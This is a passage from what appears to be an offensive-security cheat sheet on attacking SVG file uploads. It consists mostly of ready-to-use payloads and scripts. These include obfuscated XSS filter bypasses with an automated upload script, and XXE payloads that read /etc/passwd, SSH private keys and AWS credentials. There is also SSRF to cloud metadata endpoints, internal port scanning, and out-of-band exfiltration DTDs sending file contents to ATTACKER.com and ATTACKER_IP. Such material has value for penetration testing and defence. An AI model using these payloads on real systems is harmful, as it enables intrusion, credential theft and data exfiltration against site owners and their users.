  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" class="target"/>
  </svg>

  <!-- === SVG with font-face external load (tracking pixel) === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <defs>
      <style>
        @font-face {
          font-family: 'tracker';
          src: url('https://ATTACKER.com/font-load-tracker');
        }
        text { font-family: 'tracker'; }
      </style>
    </defs>
    <text x="10" y="50">tracking test</text>
  </svg>
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="SVG XSS Filter Bypass Techniques"}
  When the application sanitizes SVG content, these obfuscation techniques may bypass the filter.

  ```xml
  <!-- === HTML entity encoding === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
  </svg>

  <!-- === Hex entity encoding === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
  </svg>

  <!-- === Mixed encoding === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="&#97;l&#101;&#x72;t(1)">
  </svg>

  <!-- === Tab/newline injection in event handler === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="al&#x09;ert(1)">
  </svg>

  <svg xmlns="http://www.w3.org/2000/svg" onload="al&#x0a;ert(1)">
  </svg>

  <!-- === Case variation in element names === -->
  <SVG XMLNS="http://www.w3.org/2000/svg" ONLOAD="alert(1)">
  </SVG>

  <!-- === Namespace tricks === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <html:script xmlns:html="http://www.w3.org/1999/xhtml">alert(1)</html:script>
  </svg>

  <!-- === CDATA escaping === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script><![CDATA[al\u0065rt(document.domain)]]></script>
  </svg>

  <!-- === eval with String.fromCharCode === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
  </svg>

  <!-- === constructor technique === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="[].constructor.constructor('alert(1)')()">
  </svg>

  <!-- === setTimeout/setInterval === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="setTimeout('alert(1)',0)">
  </svg>

  <svg xmlns="http://www.w3.org/2000/svg" onload="setInterval('alert(1)',1000)">
  </svg>

  <!-- === atob (base64 decode + eval) === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">
  </svg>

  <!-- === Backtick template literals === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert`1`">
  </svg>

  <!-- === Window object reference === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="window['al'+'ert'](1)">
  </svg>

  <!-- === top/self/parent reference === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="top['al'+'ert'](1)">
  </svg>

  <!-- === document.write injection === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="document.write('<img src=x onerror=alert(1)>')">
  </svg>

  <!-- === Prototype pollution-style === -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="this['constructor']['constructor']('alert(1)')()">
  </svg>
  ```

  ```bash
  # Automated filter bypass testing
  python3 << 'PYEOF'
  import requests
  import base64

  url = "https://target.com/upload"
  cookies = {"session": "YOUR_SESSION"}

  payloads = {
      "basic_onload": '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
      "script_tag": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
      "foreignObject": '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>',
      "animate_onbegin": '<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>',
      "set_onbegin": '<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="alert(1)" attributeName="x" to="1"/></svg>',
      "a_javascript": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><rect width="500" height="500"/></a></svg>',
      "image_onerror": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="x" onerror="alert(1)" width="100" height="100"/></svg>',
      "html_entity": '<svg xmlns="http://www.w3.org/2000/svg" onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"></svg>',
      "eval_fromCharCode": '<svg xmlns="http://www.w3.org/2000/svg" onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></svg>',
      "eval_atob": '<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob(\'YWxlcnQoMSk=\'))"></svg>',
      "constructor": '<svg xmlns="http://www.w3.org/2000/svg" onload="[].constructor.constructor(\'alert(1)\')()"></svg>',
      "setTimeout": '<svg xmlns="http://www.w3.org/2000/svg" onload="setTimeout(\'alert(1)\',0)"></svg>',
      "backtick": '<svg xmlns="http://www.w3.org/2000/svg" onload="alert`1`"></svg>',
      "window_ref": '<svg xmlns="http://www.w3.org/2000/svg" onload="window[\'al\'+\'ert\'](1)"></svg>',
      "cdata_script": '<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[alert(1)]]></script></svg>',
      "namespace_trick": '<svg xmlns="http://www.w3.org/2000/svg"><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script></svg>',
      "css_import": '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("https://ATTACKER.com/track")</style></svg>',
      "animateMotion": '<svg xmlns="http://www.w3.org/2000/svg"><animateMotion onbegin="alert(1)" dur="1s" path="M0,0"/></svg>',
  }

  print(f"Testing {len(payloads)} SVG XSS bypass payloads...\n")
  
  for name, payload in payloads.items():
      files = {"file": (f"{name}.svg", payload.encode(), "image/svg+xml")}
      try:
          r = requests.post(url, files=files, cookies=cookies, timeout=5)
          status = "UPLOADED" if r.status_code in [200, 201] and "error" not in r.text.lower()[:200] else "BLOCKED"
          marker = "✓" if status == "UPLOADED" else "✗"
          print(f"  [{marker}] {name:25s} → HTTP {r.status_code} ({status})")
      except Exception as e:
          print(f"  [!] {name:25s} → ERROR: {e}")
  PYEOF
  ```
  :::
::

---

## SVG XSS in Different Rendering Contexts

::note
The same SVG payload may or may not execute depending on how the application renders it. Understanding the rendering context is critical for choosing the right payload.
::

::tabs
  :::tabs-item{icon="i-lucide-globe" label="Direct URL Access"}
  When the SVG is accessed directly via its URL (e.g., `https://target.com/uploads/image.svg`), the browser treats it as a standalone document. This is the **most exploitable** context because JavaScript runs with full privileges on the application's origin.

  ```bash
  # === Test Direct Access XSS ===
  # Step 1: Upload SVG
  cat > direct_xss.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert('Direct XSS on: ' + document.domain + '\nCookies: ' + document.cookie)">
    <rect width="300" height="200" fill="#f0f0f0"/>
    <text x="20" y="30" font-size="16">This is a test SVG</text>
  </svg>
  EOF

  curl -X POST https://target.com/upload \
    -F "file=@direct_xss.svg;type=image/svg+xml" -b "session=COOKIE"

  # Step 2: Access directly
  # Navigate to: https://target.com/uploads/direct_xss.svg
  # JavaScript WILL execute if Content-Type is image/svg+xml

  # Step 3: Verify Content-Type
  curl -sI https://target.com/uploads/direct_xss.svg | grep -i content-type
  # VULNERABLE if: Content-Type: image/svg+xml
  # SAFE if: Content-Type: application/octet-stream
  # SAFE if: Content-Disposition: attachment
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="<img> Tag Rendering"}
  When the SVG is loaded via an `<img>` tag, the browser renders it in a **restricted sandbox**. JavaScript does NOT execute, external resources are NOT loaded, and interactive elements are disabled. However, CSS-based attacks may still work.

  ```bash
  # === <img> Tag Context ===
  # SVG loaded as: <img src="/uploads/avatar.svg">
  
  # JavaScript: BLOCKED (no script execution in <img>)
  # External resources: BLOCKED (no fetch/XHR/image loads)
  # CSS animations: ALLOWED
  # CSS @import: BLOCKED
  # Event handlers: BLOCKED
  # foreignObject: BLOCKED

  # The ONLY attacks possible in <img> context:
  # 1. Visual deception (fake UI elements drawn in SVG)
  # 2. CSS-based tracking via @font-face (some browsers)
  # 3. Denial of service (billion laughs, massive SVG)

  # BUT if the SVG URL can be accessed directly by the user:
  # → Full XSS by sharing the direct URL
  # Example: User uploads SVG avatar
  # Avatar displayed via <img> (safe)
  # But https://target.com/avatars/user123.svg is directly accessible (XSS!)

  # Test if SVG URL is directly accessible
  # Check profile page for avatar URL
  curl -s https://target.com/user/profile | grep -oP 'src="[^"]*\.svg[^"]*"'
  # Then access that URL directly in browser
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Inline SVG / <object> / <embed>"}
  When SVG is embedded inline in HTML or loaded via `<object>`, `<embed>`, or `<iframe>`, JavaScript **DOES execute** with access to the parent page's DOM (same-origin).

  ```bash
  # === Inline SVG (most dangerous) ===
  # Application inserts SVG markup directly into page HTML
  # <div class="avatar">[SVG CONTENT HERE]</div>
  # JavaScript runs in the page's context — full DOM access

  # === <object> Tag ===
  # <object data="/uploads/avatar.svg" type="image/svg+xml"></object>
  # JavaScript EXECUTES
  # Can access parent document if same-origin

  # === <embed> Tag ===
  # <embed src="/uploads/avatar.svg" type="image/svg+xml">
  # JavaScript EXECUTES

  # === <iframe> Tag ===
  # <iframe src="/uploads/avatar.svg"></iframe>
  # JavaScript executes in iframe context
  # Can access parent if same-origin (no sandbox attribute)

  # === Detect rendering context ===
  # Check how the application displays the uploaded SVG
  curl -s https://target.com/page-with-uploaded-svg | grep -iE "<img|<object|<embed|<iframe|<svg" | head -10

  # If inline SVG → XSS is most impactful
  # If <object>/<embed> → XSS works
  # If <iframe> with sandbox → May be restricted
  # If <img> → No script execution but direct URL may work

  # === For inline SVG context, even simpler payloads work ===
  # Because the SVG is parsed as part of the HTML DOM
  cat > inline_xss.svg << 'EOF'
  <svg onload="alert(document.domain)">
    <script>document.write('Controlled by attacker')</script>
  </svg>
  EOF
  # Note: No xmlns needed when rendered inline in HTML5
  ```
  :::

  :::tabs-item{icon="i-lucide-link" label="Cross-Origin SVG"}
  When SVG is served from a different origin (CDN, separate subdomain), the XSS impact depends on browser same-origin policy.

  ```bash
  # === Same-Origin Check ===
  # If SVG served from: https://cdn.target.com/uploads/xss.svg
  # And app is at: https://target.com
  # → JavaScript runs on cdn.target.com (different origin)
  # → Cannot access cookies/DOM of target.com
  # → BUT may still be useful for:
  #    - Cookie theft on cdn.target.com
  #    - Phishing (URL still looks legitimate)
  #    - Chaining with other vulnerabilities

  # === Check upload storage origin ===
  # Upload file and note the URL
  curl -s -X POST https://target.com/upload \
    -F "file=@test.svg;type=image/svg+xml" -b "session=COOKIE" | \
    python3 -c "import sys,json; print(json.load(sys.stdin).get('url',''))" 2>/dev/null

  # Compare origins
  echo "App origin: https://target.com"
  echo "File origin: [check returned URL]"
  # Same origin → Full impact XSS
  # Different subdomain → Reduced impact but still reportable
  # External CDN (S3, CloudFront) → Limited impact

  # === Subdomain cookie scope ===
  # If cookie is set with Domain=.target.com
  # Then SVG on cdn.target.com CAN access the cookie
  # Check cookie scope:
  curl -sI https://target.com/login -c - | grep -i "set-cookie" | grep -i "domain"

  # === S3/Cloud Storage Direct Access ===
  # Even if served from S3, if bucket allows direct access:
  # XSS executes on *.s3.amazonaws.com domain
  # Lower severity but still valid finding
  ```
  :::
::

---

## XXE via SVG Upload

::caution
XXE through SVG is a **server-side** vulnerability. It occurs when the server parses the SVG's XML content using a parser that processes external entities. This is independent of how the file is served to users.
::

### Basic XXE Payloads

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="File Read XXE"}
  ```xml
  <!-- === Read /etc/passwd via SVG XXE === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <text x="10" y="20" font-size="14">&xxe;</text>
  </svg>

  <!-- === Read /etc/hostname === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === Read application configuration === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///var/www/html/.env">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === Read /etc/shadow (if running as root) === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/shadow">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === Read Windows files === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === Read web.config (IIS) === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === Read SSH private key === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20" font-size="8">&xxe;</text>
  </svg>

  <!-- === Read AWS credentials === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///home/ubuntu/.aws/credentials">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  ```

  ```bash
  # Upload XXE SVG for file read
  cat > xxe_read.svg << 'SVGEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="800" height="800">
    <text x="10" y="20" font-size="12">&xxe;</text>
  </svg>
  SVGEOF

  curl -X POST https://target.com/upload \
    -F "file=@xxe_read.svg;type=image/svg+xml" \
    -b "session=COOKIE" -v

  # Check if file content appears in:
  # 1. The upload response
  # 2. The served SVG file
  # 3. A rendered thumbnail/preview

  # If server converts SVG to PNG/JPEG:
  # The text element with &xxe; content gets rendered into the image
  # Download the generated thumbnail and check for /etc/passwd content

  curl -s "https://target.com/uploads/xxe_read.svg" | grep -c "root:"
  # Or download generated thumbnail
  curl -s "https://target.com/thumbnails/xxe_read.png" -o thumbnail.png
  # Open thumbnail.png — file contents may be rendered as text

  # === Batch test common sensitive files ===
  FILES=(
    "/etc/passwd"
    "/etc/hostname"
    "/etc/hosts"
    "/etc/os-release"
    "/proc/self/environ"
    "/proc/self/cmdline"
    "/var/www/html/.env"
    "/var/www/html/config.php"
    "/var/www/html/wp-config.php"
    "/var/www/html/configuration.php"
    "/opt/app/.env"
    "/app/.env"
    "/home/ubuntu/.aws/credentials"
    "/root/.ssh/id_rsa"
  )

  for filepath in "${FILES[@]}"; do
    safe_name=$(echo "$filepath" | tr '/' '_')
    cat > "xxe_${safe_name}.svg" << SVGEOF
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file://${filepath}">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  SVGEOF
    
    RESPONSE=$(curl -s -X POST "https://target.com/upload" \
      -F "file=@xxe_${safe_name}.svg;type=image/svg+xml" -b "session=COOKIE" 2>/dev/null)
    
    # Check response for file content indicators
    if echo "$RESPONSE" | grep -qiE "root:|www-data|ubuntu|admin|password|secret|key|token"; then
      echo "[+] POSSIBLE XXE HIT: $filepath"
      echo "    Response snippet: $(echo "$RESPONSE" | head -c 200)"
    else
      echo "[-] $filepath → No obvious leak in response"
    fi
    rm -f "xxe_${safe_name}.svg"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="SSRF via SVG XXE"}
  ```xml
  <!-- === SSRF to AWS Metadata === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === SSRF to AWS IAM Credentials === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === SSRF to GCP Metadata === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === SSRF to Azure Metadata === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === SSRF to Internal Services === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === SSRF Port Scanning === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- === SSRF to Internal Admin Panels === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  ```

  ```bash
  # Internal port scan via SVG XXE
  for port in 80 443 8080 8443 3000 3306 5432 6379 27017 9200 11211 5672 8888 9000 4444; do
    cat > "ssrf_port_${port}.svg" << SVGEOF
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:${port}/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  SVGEOF

    START=$(date +%s%N)
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@ssrf_port_${port}.svg;type=image/svg+xml" -b "session=COOKIE" \
      --max-time 10 2>/dev/null)
    END=$(date +%s%N)
    DURATION=$(( (END - START) / 1000000 ))

    echo "Port $port → HTTP $STATUS (${DURATION}ms)"
    # Significant time difference may indicate open port
    rm -f "ssrf_port_${port}.svg"
  done

  # Cloud metadata endpoints to test
  CLOUD_ENDPOINTS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://169.254.169.254/latest/user-data"
    "http://169.254.169.254/latest/meta-data/hostname"
    "http://169.254.169.254/latest/meta-data/local-ipv4"
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    "http://169.254.169.254/metadata/v1/"
  )

  for endpoint in "${CLOUD_ENDPOINTS[@]}"; do
    safe_name=$(echo "$endpoint" | md5sum | cut -c1-8)
    cat > "ssrf_cloud_${safe_name}.svg" << SVGEOF
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "${endpoint}">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  SVGEOF
    RESPONSE=$(curl -s -X POST "https://target.com/upload" \
      -F "file=@ssrf_cloud_${safe_name}.svg;type=image/svg+xml" -b "session=COOKIE")
    echo "Endpoint: $endpoint"
    echo "Response: $(echo "$RESPONSE" | head -c 200)"
    echo "---"
    rm -f "ssrf_cloud_${safe_name}.svg"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="PHP Wrapper XXE"}
  ```xml
  <!-- === PHP Wrappers (when server uses PHP XML parser) === -->

  <!-- php://filter to read files as base64 (avoids XML parsing errors) -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- Read PHP source code (won't execute, returns base64) -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- Read .env file as base64 -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.env">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- expect:// wrapper for RCE (if expect module is loaded) -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "expect://id">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- data:// wrapper -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "data://text/plain;base64,SSBhbSBhIHRlc3Q=">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  ```

  ```bash
  # Upload php://filter XXE SVG
  cat > xxe_php_filter.svg << 'SVGEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="800" height="200">
    <text x="10" y="20" font-size="10">&xxe;</text>
  </svg>
  SVGEOF

  RESPONSE=$(curl -s -X POST https://target.com/upload \
    -F "file=@xxe_php_filter.svg;type=image/svg+xml" -b "session=COOKIE")

  # Check for base64 in response
  echo "$RESPONSE" | grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | while read b64; do
    echo "--- Decoded base64 ---"
    echo "$b64" | base64 -d 2>/dev/null | head -5
    echo ""
  done

  # Also check served/rendered file
  curl -s "https://target.com/uploads/xxe_php_filter.svg" | \
    grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | head -1 | base64 -d 2>/dev/null
  ```
  :::
::

### Blind/Out-of-Band XXE

::warning
When the XXE data is not reflected in the response (blind XXE), you need out-of-band techniques to exfiltrate data to an external server you control.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="OOB XXE via Parameter Entities"}
  ```xml
  <!-- === Blind XXE with External DTD === -->
  <!-- Step 1: Host this DTD file on your server as evil.dtd -->
  <!--
  File: evil.dtd (hosted at https://ATTACKER.com/evil.dtd)
  Contents:
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER.com/exfil?data=%file;'>">
  %eval;
  %exfil;
  -->

  <!-- Step 2: Upload this SVG -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % dtd SYSTEM "https://ATTACKER.com/evil.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" fill="red"/>
  </svg>

  <!-- === Alternative: FTP-based exfiltration (handles multiline) === -->
  <!--
  evil_ftp.dtd on your server:
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER.com:2121/%file;'>">
  %eval;
  %exfil;
  -->

  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % dtd SYSTEM "https://ATTACKER.com/evil_ftp.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100"/>
  </svg>

  <!-- === Base64 encoded exfiltration (avoids URL special chars) === -->
  <!--
  evil_b64.dtd on your server:
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER.com/exfil?d=%file;'>">
  %eval;
  %exfil;
  -->

  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % dtd SYSTEM "https://ATTACKER.com/evil_b64.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100"/>
  </svg>
  ```

  ```bash
  # === Setup Attacker Server ===

  # Step 1: Create evil.dtd
  mkdir -p /tmp/xxe_server
  cat > /tmp/xxe_server/evil.dtd << 'DTDEOF'
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8888/exfil?data=%file;'>">
  %eval;
  %exfil;
  DTDEOF

  # Step 2: Serve DTD
  cd /tmp/xxe_server
  python3 -m http.server 8888 &

  # Step 3: Create and upload SVG
  cat > blind_xxe.svg << 'SVGEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8888/evil.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" fill="blue"/>
  </svg>
  SVGEOF

  curl -X POST https://target.com/upload \
    -F "file=@blind_xxe.svg;type=image/svg+xml" -b "session=COOKIE"

  # Step 4: Check Python HTTP server logs for incoming request with data
  # Look for: GET /exfil?data=root:x:0:0:root:/root:/bin/bash...
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="DNS-Based Blind XXE"}
  ```xml
  <!-- === DNS Exfiltration (when HTTP is blocked) === -->
  <!-- Only confirms XXE exists, limited data exfil -->
  
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://xxe-confirmed.YOUR_COLLABORATOR.com/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- DNS with hostname exfiltration -->
  <!--
  evil_dns.dtd:
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.YOUR_COLLABORATOR.com/'>">
  %eval;
  %exfil;
  -->

  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % dtd SYSTEM "http://YOUR_COLLABORATOR.com/evil_dns.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100"/>
  </svg>
  ```

  ```bash
  # Using Interactsh for DNS callback detection
  interactsh-client -v 2>&1 | tee /tmp/interactsh.log &
  CALLBACK_URL=$(grep -oP '[a-z0-9]+\.interact\.sh' /tmp/interactsh.log | head -1)

  cat > dns_xxe.svg << SVGEOF
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://xxe-test.${CALLBACK_URL}/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  SVGEOF

  curl -X POST https://target.com/upload \
    -F "file=@dns_xxe.svg;type=image/svg+xml" -b "session=COOKIE"

  # Check interactsh output for DNS/HTTP callbacks
  echo "Waiting for callback... (check interactsh output)"
  sleep 10
  grep "xxe-test" /tmp/interactsh.log
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Error-Based XXE"}
  ```xml
  <!-- === Trigger XML parsing errors that leak file content === -->

  <!-- Error via non-existent file reference with file content in path -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100"/>
  </svg>
  <!-- Error message may contain: "Failed to open file:///nonexistent/webserver01" -->
  <!-- This leaks the hostname in the error message -->

  <!-- Error via invalid URL with file content -->
  <!--
  error.dtd:
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
  -->

  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % dtd SYSTEM "https://ATTACKER.com/error.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100"/>
